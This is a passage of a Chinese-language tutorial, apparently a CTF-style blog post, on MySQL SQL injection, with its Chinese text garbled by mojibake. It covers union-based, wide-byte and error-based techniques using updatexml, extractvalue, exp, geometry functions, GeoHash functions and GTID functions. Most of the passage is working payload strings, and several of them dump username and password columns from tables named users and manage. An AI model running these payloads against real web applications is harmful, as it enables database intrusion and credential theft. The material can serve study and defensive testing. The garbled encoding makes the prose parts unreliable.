class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; </span><br><span class="line">?id=1&quot; </span><br><span class="line">?id=1&#x27;) </span><br><span class="line">?id=1&quot;) </span><br><span class="line">?id=1&#x27; or 1#</span><br><span class="line">?id=1&#x27; or 0#</span><br><span class="line">?id=1&#x27; or 1=1#</span><br><span class="line">?id=1&#x27; and 1=2#</span><br><span class="line">?id=1&#x27; and sleep(5)#</span><br><span class="line">?id=1&#x27; and 1=2 or &#x27; </span><br><span class="line">?id=1\</span><br></pre></td></tr></table></figure></li><li><p>çŒœæµ‹SQLæŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µæ•°</p><ul><li>ä½¿ç”¨ <strong>order&#x2F;group by</strong> è¯­å¥ï¼Œé€šè¿‡å¾€åè¾¹æ‹¼æ¥æ•°å­—æŒ‡å¯¼é¡µé¢æŠ¥é”™ï¼Œå¯ç¡®å®šå­—æ®µæ•°é‡ã€‚</li></ul></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 1#</span><br><span class="line">1&#x27; order by 2#</span><br><span class="line">1&#x27; order by 3#</span><br><span class="line">1 order by 1</span><br><span class="line">1 order by 2</span><br><span class="line">1 order by 3</span><br></pre></td></tr></table></figure><ul><li>ä½¿ç”¨ union select è”åˆæŸ¥è¯¢ï¼Œä¸æ–­åœ¨ union select åé¢åŠ æ•°å­—ï¼Œç›´åˆ°ä¸æŠ¥é”™ï¼Œå³å¯ç¡®å®šå­—æ®µæ•°é‡ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1#</span><br><span class="line">1&#x27; union select 1,2#</span><br><span class="line">1&#x27; union select 1,2,3#</span><br><span class="line">1 union select 1#</span><br><span class="line">1 union select 1,2#</span><br><span class="line">1 union select 1,2,3#</span><br></pre></td></tr></table></figure><ol start="3"><li><p>ç¡®å®šæ˜¾ç¤ºæ•°æ®çš„å­—æ®µä½ç½®ï¼Œä½¿ç”¨ union select 1,2,3,4,â€¦ æ ¹æ®å›æ˜¾çš„å­—æ®µæ•°ï¼Œåˆ¤æ–­å›æ˜¾æ•°æ®çš„å­—æ®µä½ç½®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1#</span><br><span class="line">-1&#x27; union select 1,2#</span><br><span class="line">-1&#x27; union select 1,2,3#</span><br><span class="line">-1 union select 1#</span><br><span class="line">-1 union select 1,2#</span><br><span class="line">-1 union select 1,2,3#</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>æ³¨æ„ï¼š</p><ul><li>è‹¥ç¡®å®šé¡µé¢æœ‰å›æ˜¾ï¼Œä½†æ˜¯é¡µé¢ä¸­å¹¶æ²¡æœ‰æˆ‘ä»¬å®šä¹‰çš„ç‰¹æ®Šæ ‡è®°æ•°å­—å‡ºç°ï¼Œå¯èƒ½æ˜¯é¡µé¢è¿›è¡Œçš„æ˜¯å•è¡Œæ•°æ®è¾“å‡ºï¼Œæˆ‘ä»¬è®©å‰è¾¹çš„ select æŸ¥è¯¢æ¡ä»¶è¿”å›ç»“æœä¸ºç©ºå³å¯ã€‚</li><li>â¼€å®šè¦æ‹¼æ¥å¤Ÿè¶³å¤Ÿçš„å­—æ®µæ•°ï¼Œå¦åˆ™SQLè¯­å¥æŠ¥é”™ã€‚</li></ul></blockquote><ol start="4"><li><p>åœ¨å›æ˜¾æ•°æ®çš„å­—æ®µä½ç½®ä½¿ç”¨ union select å°†æˆ‘ä»¬æ‰€éœ€è¦çš„æ•°æ®æŸ¥è¯¢å‡ºæ¥å³å¯ã€‚åŒ…æ‹¬ä½†ä¸é™äºï¼š</p><ul><li><p>è·å–å½“å‰æ•°æ®åº“å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,database()--+</span><br></pre></td></tr></table></figure></li><li><p>è·å–å½“å‰æ•°æ®åº“å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br><span class="line"></span><br><span class="line">-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</span><br></pre></td></tr></table></figure></li><li><p>è·å–è¡¨ä¸­çš„å­—æ®µå</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line"></span><br><span class="line">-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3--+</span><br></pre></td></tr></table></figure></li><li><p>è·å–æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,group_concat(id,0x7c,username,0x7c,password) from users--+</span><br><span class="line"></span><br><span class="line">-1&#x27; union select 1,(select group_concat(id,0x7c,username,0x7c,password) from users),3--+</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬æƒ…å†µä¸‹å°±æ˜¯è¿™æ ·çš„ä¸€ä¸ªé¡ºåºï¼š</p><p><code>ç¡®å®šè”åˆæŸ¥è¯¢çš„å­—æ®µæ•°-&gt;ç¡®å®šè”åˆæŸ¥è¯¢å›æ˜¾ä½ç½®-&gt;çˆ†åº“-&gt;çˆ†è¡¨-&gt;çˆ†å­—æ®µ-&gt;çˆ†æ•°æ®</code></p></li></ul></li></ol><p><em>è¿™é‡Œè¿˜ä½¿ç”¨äº†<code>group_concat()</code>å‡½æ•°æ¥æ‹¼æ¥å¤šä¸ªæŸ¥è¯¢ï¼Œå¾ˆå¤šæŸ¥è¯¢æ“ä½œä¸­éƒ½æœ‰è¿™ä¸ªå‡½æ•°ï¼Œæé«˜æŸ¥è¯¢æ•ˆç‡ï¼Œå¹¶ä¸”å¯ä»¥æ‹¼æ¥ç‰¹æ®Šå­—ç¬¦æ¥è¿›è¡Œåˆ†å‰²ï¼ŒåŒæ—¶ä½¿ç”¨äº†ä¹‹å‰è®²åˆ°çš„<code>information_schema</code>åº“æ¥è·å–è¡¨ã€å­—æ®µçš„ä¿¡æ¯ï¼Œä½ç‰ˆæœ¬å¹¶ä¸å­˜åœ¨è¿™ä¸ªåº“ï¼ŒåŒæ—¶å¾ˆå¤šé¢˜ä¹Ÿä¼šè¿‡æ»¤è¿™ä¸ªåº“ï¼Œæˆ‘ä»¬ä¹‹åä¹Ÿä¼šè®²åˆ°å…¶ä»–åº“æ˜¯å¦‚ä½•ä½¿ç”¨çš„</em></p><hr><h3 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h3><blockquote><p>å‡ºç°æ¡ä»¶:1.æ•°æ®åº“ä½¿ç”¨çš„æ˜¯GBKç¼–ç <br>         2.PHPç¼–ç ä¸ºUTF-8</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410222209999.png"></p><p><strong>åŸå› ï¼š</strong><br>1.ç°åœ¨å¤§å¤šæ•°çš„ç½‘ç«™å¯¹äºSQLæ³¨å…¥éƒ½åšäº†ä¸€å®šçš„æ–¹æ³•ï¼Œä¾‹å¦‚ä½¿ç”¨ä¸€äº›Mysqlä¸­è½¬ä¹‰çš„å‡½æ•°<code>addslashes</code>,<code>mysql_real_escape_string</code>,<code>mysql_escape_string</code>ç­‰ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯é…ç½®<code>magic_quote_gpc</code>,ä¸è¿‡PHPé«˜ç‰ˆæœ¬å·²ç»ç§»é™¤æ­¤åŠŸèƒ½ã€‚å…¶å®è¿™äº›å‡½æ•°å°±æ˜¯ä¸ºäº†è¿‡æ»¤ç”¨æˆ·è¾“å…¥çš„ä¸€äº›æ•°æ®ï¼Œå¯¹ç‰¹æ®Šçš„å­—ç¬¦åŠ ä¸Šåæ–œæ <code>\</code>è¿›è¡Œè½¬ä¹‰ã€‚<br>2.ç½‘ç«™å¼€å¯äº†<code>magic_quote_gpc</code>,æˆ–è€…ä½¿ç”¨äº†ä¸Šé¢çš„è½¬ä¹‰å‡½æ•°æ•°æ®åº“è®¾ç½®æˆgbkç¼–ç ï¼ˆä¸æ˜¯htmlç¼–ç <br>3.åœ¨ç¼–ç ä¸­ï¼Œgbkç¼–ç å ç”¨2ä¸ªå­—ç¬¦ï¼Œascâ€–å ç”¨1ä¸ªå­—ç¬¦ï¼Œæ”»å‡»è€…æ¶æ„æ„é€ ï¼ŒæŠŠascå­—ç¬¦åƒæ‰ï¼Œå°±èƒ½è¿›è¡Œä¸‹ä¸€æ­¥æ”»å‡»</p><hr><h3 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><h4 id="ç›¸å…³è¯­æ³•çŸ¥è¯†-1"><a href="#ç›¸å…³è¯­æ³•çŸ¥è¯†-1" class="headerlink" title="ç›¸å…³è¯­æ³•çŸ¥è¯†"></a>ç›¸å…³è¯­æ³•çŸ¥è¯†</h4><p><em>æŠ¥é”™æ³¨å…¥çš„æ€è·¯å°±åœ¨ï¼Œåˆ©ç”¨æˆ‘ä»¬çš„ç‰¹å®šçš„æŸ¥è¯¢æŒ‡ä»¤æˆ–è€…sqlå‡½æ•°è¢«æ‰§è¡Œï¼Œä»è€Œæ„é€ ä¸€äº›ç‰¹å®šå‡½æ•°çš„æŠ¥é”™è¿›è¡Œå†…å®¹å›æ˜¾ï¼ŒæŠ¥é”™çš„è¿‡ç¨‹å¯èƒ½ä¼šå‡ºç°åœ¨æŸ¥è¯¢æˆ–è€…æ’å…¥ç”šè‡³åˆ é™¤çš„è¿‡ç¨‹ä¸­</em></p><h4 id="æ³¨å…¥æµç¨‹-1"><a href="#æ³¨å…¥æµç¨‹-1" class="headerlink" title="æ³¨å…¥æµç¨‹"></a>æ³¨å…¥æµç¨‹</h4><h5 id="0x01-Updatexml-XML-document-XPath-string-new-value"><a href="#0x01-Updatexml-XML-document-XPath-string-new-value" class="headerlink" title="0x01 Updatexml(XML_document, XPath_string, new_value)"></a>0x01 Updatexml(XML_document, XPath_string, new_value)</h5><ul><li><p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§° æ–‡ä¸­ä¸ºDoc</p></li><li><p>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£Xpathè¯­æ³•ï¼Œå¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾æ•™ç¨‹ã€‚è¿™é‡Œç»™ä¸€å¼ å›¾æ¥ç®€å•äº†è§£ä¸‹<code>Xpath</code><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410221706514.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/html/body/div[1]</span><br></pre></td></tr></table></figure><p>å¤åˆ¶ä¸‹æ¥æ˜¯è¿™æ ·å­çš„ï¼Œå°±å¯ä»¥æŠŠHTMLç†è§£æˆLinuxçš„æ–‡ä»¶ç»“æ„ï¼Œé‡Œé¢çš„æ ‡ç­¾ä½ å¯ä¸ç†è§£æˆä¸€ä¸ªä¸€ä¸ªçš„æ–‡ä»¶å¤¹ï¼Œä»–ä»¬ä¹‹é—´å…·æœ‰çˆ¶å­å…³ç³»ã€‚</p></li><li><p>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®</p></li></ul><p>ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼</p><p>ç”±äº<code>updatexml</code>çš„ç¬¬äºŒä¸ªå‚æ•°éœ€è¦<code>Xpath</code>æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœä¸ç¬¦åˆ<code>xml</code>æ ¼å¼çš„è¯­æ³•ï¼Œå°±å¯ä»¥å®ç°æŠ¥é”™æ³¨å…¥äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™æ ·ä¸€æ®µä»£ç ï¼Œå°±æ„æˆäº†æˆ‘ä»¬çš„æŠ¥é”™æ³¨å…¥ï¼Œå› ä¸ºç¬¬äºŒä¸ªå‚æ•°ä¸ç¬¦åˆæ ‡å‡†åŒæ—¶ä¹Ÿä¼šæ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„è¯­å¥<code>(select user())</code>å› æ­¤åœ¨æŠ¥é”™ä¿¡æ¯é‡Œï¼Œä¼šæŠŠæˆ‘ä»¬çš„<code>ç”¨æˆ·</code>ä¿¡æ¯ç»™å›å¸¦å‡ºæ¥</p><h5 id="0x02-extractvalue"><a href="#0x02-extractvalue" class="headerlink" title="0x02 extractvalue()"></a>0x02 extractvalue()</h5><p><code>extractvalue()</code>å’Œ<code>updatexml()</code>å‡½æ•°ç±»ä¼¼ï¼Œåªä¸è¿‡ä»–åªæœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç”¨èµ·æ¥å’Œ<code>updatexml()</code>å·®ä¸å¤š</p><p>ç¬¬äºŒä¸ªå‚æ•°å’Œ<code>updatexml()</code>ä¸€æ ·xmlï¼Œæ–‡æ¡£ä¸­æŸ¥æ‰¾å­—ç¬¦ä½ç½®æ˜¯ç”¨ &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;â€¦è¿™ç§æ ¼å¼ï¼Œå¦‚æœæˆ‘ä»¬å†™å…¥å…¶ä»–æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”ä¼šè¿”å›æˆ‘ä»¬å†™å…¥çš„éæ³•æ ¼å¼å†…å®¹ï¼Œè€Œè¿™ä¸ªéæ³•çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„å†…å®¹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(extractvalue(â€˜anythingâ€™,concat(â€˜#â€™,substring(hex((select database())),1,5))))</span><br></pre></td></tr></table></figure><h5 id="0x03-exp-x"><a href="#0x03-exp-x" class="headerlink" title="0x03 exp(x)"></a>0x03 exp(x)</h5><p>è¿”å› e çš„ x æ¬¡æ–¹,å½“ æ•°æ®è¿‡å¤§ æº¢å‡ºæ—¶æŠ¥é”™ï¼Œå³ x &gt; 709</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mail=&#x27;) or exp(~(select * from (select (concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e))) as asd))--+</span><br></pre></td></tr></table></figure><h5 id="0x04-geometrycollection-mysql-ç‰ˆæœ¬5-5"><a href="#0x04-geometrycollection-mysql-ç‰ˆæœ¬5-5" class="headerlink" title="0x04 geometrycollection() mysql ç‰ˆæœ¬5.5"></a>0x04 geometrycollection() mysql ç‰ˆæœ¬5.5</h5><p>ï¼ˆ1ï¼‰å‡½æ•°è§£é‡Šï¼š<br> <code>GeometryCollection</code>æ˜¯ç”±1ä¸ªæˆ–å¤šä¸ªä»»æ„ç±»å‡ ä½•å¯¹è±¡æ„æˆçš„å‡ ä½•å¯¹è±¡ã€‚<code>GeometryCollection</code>ä¸­çš„æ‰€æœ‰å…ƒç´ å¿…é¡»å…·æœ‰ç›¸åŒçš„ç©ºé—´å‚è€ƒç³»ï¼ˆå³ç›¸åŒçš„åæ ‡ç³»ï¼‰ã€‚</p><p>ï¼ˆ2ï¼‰å®˜æ–¹æ–‡æ¡£ä¸­ä¸¾ä¾‹çš„ç”¨æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GEOMETRYCOLLECTION(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20))</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰æŠ¥é”™åŸå› ï¼š<br> å› ä¸ºMYSQLæ— æ³•ä½¿ç”¨è¿™æ ·çš„å­—ç¬¦ä¸²ç”»å‡ºå›¾å½¢ï¼Œæ‰€ä»¥æŠ¥é”™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) and geometrycollection((select * from(select * from(select version())a)b)); %23</span><br><span class="line">1&#x27;) and geometrycollection((select * from(select * from(select column_name from information_schema.columns where table_name=&#x27;manage&#x27; limit 0,1)a)b)); %23</span><br><span class="line">1&#x27;) and geometrycollection((select * from(select * from(select distinct concat(0x23,user,0x2a,password,0x23,name,0x23) FROM manage limit 0,1)a)b)); %23</span><br></pre></td></tr></table></figure><h5 id="0x05-multipoint-mysql-ç‰ˆæœ¬5-5"><a href="#0x05-multipoint-mysql-ç‰ˆæœ¬5-5" class="headerlink" title="0x05 multipoint() mysql ç‰ˆæœ¬5.5"></a>0x05 multipoint() mysql ç‰ˆæœ¬5.5</h5><p>ï¼ˆ1ï¼‰å‡½æ•°è§£é‡Šï¼š<br> MultiPointæ˜¯ä¸€ç§ç”±Pointå…ƒç´ æ„æˆçš„å‡ ä½•å¯¹è±¡é›†åˆã€‚è¿™äº›ç‚¹æœªä»¥ä»»ä½•æ–¹å¼è¿æ¥æˆ–æ’åºã€‚</p><p> ï¼ˆ2ï¼‰æŠ¥é”™åŸå› ï¼š<br> åŒæ ·æ˜¯å› ä¸ºæ— æ³•ä½¿ç”¨å­—ç¬¦ä¸²ç”»å‡ºå›¾å½¢ä¸<code>geometrycollection</code>ç±»ä¼¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) and multipoint((select * from(select * from(select version())a)b)); %23</span><br></pre></td></tr></table></figure><h5 id="0x06-polygon"><a href="#0x06-polygon" class="headerlink" title="0x06 polygon()"></a>0x06 polygon()</h5><p>polygonæ¥è‡ªå¸Œè…Šã€‚ â€œPolyâ€ æ„å‘³ â€œmanyâ€ ï¼Œ â€œgonâ€ æ„å‘³ â€œangleâ€.<br> Polygonæ˜¯ä»£è¡¨å¤šè¾¹å‡ ä½•å¯¹è±¡çš„å¹³é¢Surfaceã€‚å®ƒç”±å•ä¸ªå¤–éƒ¨è¾¹ç•Œä»¥åŠ0æˆ–å¤šä¸ªå†…éƒ¨è¾¹ç•Œå®šä¹‰ï¼Œå…¶ä¸­ï¼Œæ¯ä¸ªå†…éƒ¨è¾¹ç•Œå®šä¹‰ä¸ºPolygonä¸­çš„1ä¸ªå­”ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or polygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage))asd)asd))--+</span><br></pre></td></tr></table></figure><h5 id="0x07-mutipolygon"><a href="#0x07-mutipolygon" class="headerlink" title="0x07 mutipolygon()"></a>0x07 mutipolygon()</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or multipolygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage))asd)asd))</span><br></pre></td></tr></table></figure><h5 id="0x08-linestring-ï¼‰"><a href="#0x08-linestring-ï¼‰" class="headerlink" title="0x08 linestring(ï¼‰"></a>0x08 linestring(ï¼‰</h5><p>æŠ¥é”™åŸç†ï¼š<br> mysqlçš„æœ‰äº›å‡ ä½•å‡½æ•°ï¼ˆ  ä¾‹å¦‚geometrycollection()ï¼Œmultipoint()ï¼Œpolygon()ï¼Œmultipolygon()ï¼Œlinestring()ï¼Œmultilinestring() ï¼‰å¯¹å‚æ•°è¦æ±‚ä¸ºå‡ ä½•æ•°æ®ï¼Œè‹¥ä¸æ»¡è¶³è¦æ±‚åˆ™ä¼šæŠ¥é”™ï¼Œé€‚ç”¨äº5.1-5.5ç‰ˆæœ¬ (5.0.ä¸­å­˜åœ¨ä½†æ˜¯ä¸ä¼šæŠ¥é”™)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) and linestring((select * from(select * from(select database())a)b))--+;</span><br></pre></td></tr></table></figure><h5 id="0x09-multilinestring"><a href="#0x09-multilinestring" class="headerlink" title="0x09 multilinestring()"></a>0x09 multilinestring()</h5><p>åŒä¸Š</p><h5 id="0x0a-ST-LatFromGeoHash-ï¼ˆmysql-5-7-xï¼‰"><a href="#0x0a-ST-LatFromGeoHash-ï¼ˆmysql-5-7-xï¼‰" class="headerlink" title="0x0a ST.LatFromGeoHash()ï¼ˆmysql&gt;&#x3D;5.7.xï¼‰"></a>0x0a ST.LatFromGeoHash()ï¼ˆmysql&gt;&#x3D;5.7.xï¼‰</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or ST_LatFromGeoHash((select * from(select * from(select (select (concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e))))a)b))--+</span><br></pre></td></tr></table></figure><h5 id="0x0b-ST-LongFromGeoHash"><a href="#0x0b-ST-LongFromGeoHash" class="headerlink" title="0x0b ST.LongFromGeoHash"></a>0x0b ST.LongFromGeoHash</h5><p>åŒä¸Š åµŒå¥—æŸ¥è¯¢</p><h5 id="0x0c-ST-Pointfromgeohash-mysql-5-7"><a href="#0x0c-ST-Pointfromgeohash-mysql-5-7" class="headerlink" title="0x0c ST_Pointfromgeohash (mysql&gt;5.7)"></a>0x0c ST_Pointfromgeohash (mysql&gt;5.7)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#è·å–æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯</span><br><span class="line">&#x27;)or  ST_PointFromGeoHash(version(),1)--+</span><br><span class="line">&#x27;)or  ST_PointFromGeoHash((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)--+</span><br><span class="line">&#x27;)or  ST_PointFromGeoHash((select column_name from information_schema.columns where table_name = &#x27;manage&#x27; limit 0,1),1)--+</span><br><span class="line">&#x27;)or  ST_PointFromGeoHash((concat(0x23,(select group_concat(user,&#x27;:&#x27;,`password`) from manage),0x23)),1)--+</span><br></pre></td></tr></table></figure><h5 id="0x0d-GTID-MySQL-5-6-X-æ˜¾é”™"><a href="#0x0d-GTID-MySQL-5-6-X-æ˜¾é”™" class="headerlink" title="0x0d GTID (MySQL &gt;&#x3D; 5.6.X - æ˜¾é”™&lt;&#x3D;200)"></a>0x0d GTID (MySQL &gt;&#x3D; 5.6.X - æ˜¾é”™&lt;&#x3D;200)</h5><h6 id="0x01-GTID"><a href="#0x01-GTID" class="headerlink" title="0x01 GTID"></a><strong>0x01 GTID</strong></h6><p> GTIDæ˜¯MySQLæ•°æ®åº“æ¯æ¬¡æäº¤äº‹åŠ¡åç”Ÿæˆçš„ä¸€ä¸ªå…¨å±€äº‹åŠ¡æ ‡è¯†ç¬¦ï¼ŒGTIDä¸ä»…åœ¨æœ¬æœåŠ¡å™¨ä¸Šæ˜¯å”¯ä¸€çš„ï¼Œå…¶åœ¨å¤åˆ¶æ‹“æ‰‘ä¸­ä¹Ÿæ˜¯å”¯ä¸€çš„</p><blockquote><p>GTIDçš„è¡¨ç°å½¢å¼ -&gt; GTID  &#x3D;source_id:transaction_idå…¶ä¸­source_idä¸€èˆ¬ä¸ºæ•°æ®åº“çš„uuidï¼Œtransaction_idä¸ºäº‹åŠ¡IDï¼Œä»1å¼€å§‹3E11FA47-71CA-11E1-9E33-C80AA9429562:23å¦‚ä¸Šé¢çš„GTIDå¯ä»¥çœ‹å‡ºè¯¥äº‹åŠ¡ä¸ºUUIDä¸º3E11FA47-71CA-11E1-9E33-C80AA9429562çš„æ•°æ®åº“çš„23å·äº‹åŠ¡</p></blockquote><p><strong>GTIDé›†åˆ</strong>(ä¸€ç»„å…¨å±€äº‹åŠ¡æ ‡è¯†ç¬¦)ï¼š<br> GTIDé›†åˆä¸ºå¤šä¸ªå•GTIDå’Œä¸€ä¸ªèŒƒå›´å†…GTIDçš„é›†åˆï¼Œä»–ä¸»è¦ç”¨äºå¦‚ä¸‹åœ°æ–¹</p><ul><li>gtid_executed ç³»ç»Ÿå˜é‡</li><li>gtid_purgedç³»ç»Ÿå˜é‡</li><li>GTID_SUBSET() å’Œ GTID_SUBTRACT()å‡½æ•°</li></ul><p>æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3E11FA47-71CA-11E1-9E33-C80AA9429562:1-5</span><br></pre></td></tr></table></figure><h6 id="0X02-å‡½æ•°è¯¦è§£"><a href="#0X02-å‡½æ•°è¯¦è§£" class="headerlink" title="0X02 å‡½æ•°è¯¦è§£"></a><strong>0X02 å‡½æ•°è¯¦è§£</strong></h6><p>GTID_SUBSET() å’Œ GTID_SUBTRACT() å‡½æ•°ï¼Œæˆ‘ä»¬çŸ¥é“ä»–çš„è¾“å…¥å€¼æ˜¯ GTIDset ï¼Œå½“è¾“å…¥æœ‰è¯¯æ—¶ï¼Œå°±ä¼šæŠ¥é”™</p><ol><li>GTID_SUBSET( set1 , set2 ) - è‹¥åœ¨ set1 ä¸­çš„ GTIDï¼Œä¹Ÿåœ¨ set2 ä¸­ï¼Œè¿”å› trueï¼Œå¦åˆ™è¿”å› false ( set1 æ˜¯ set2 çš„å­é›†)</li><li>GTID_SUBTRACT( set1 , set2 ) - è¿”å›åœ¨ set1 ä¸­ï¼Œä¸åœ¨ set2 ä¸­çš„ GTID é›†åˆ ( set1 ä¸ set2 çš„å·®é›†)<br> æ­£å¸¸æƒ…å†µå¦‚ä¸‹</li></ol><blockquote><p>GTID_SUBSET(â€˜3E11FA47-71CA-11E1-9E33-C80AA9429562:23â€™,â€˜3E11FA47-71CA-11E1-9E33-C80AA9429562:21-57â€™)GTID_SUBTRACT(â€˜3E11FA47-71CA-11E1-9E33-C80AA9429562:21-57â€™,â€˜3E11FA47-71CA-11E1-9E33-C80AA9429562:20-25â€™)</p></blockquote><h6 id="0x03-æ³¨å…¥è¿‡ç¨‹-payload"><a href="#0x03-æ³¨å…¥è¿‡ç¨‹-payload" class="headerlink" title="0x03 æ³¨å…¥è¿‡ç¨‹( payload )"></a><strong>0x03 æ³¨å…¥è¿‡ç¨‹( payload )</strong></h6><p><strong>GTID_SUBSETå‡½æ•°</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br></pre></td></tr></table></figure><p><strong>GTID_SUBTRACT</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from 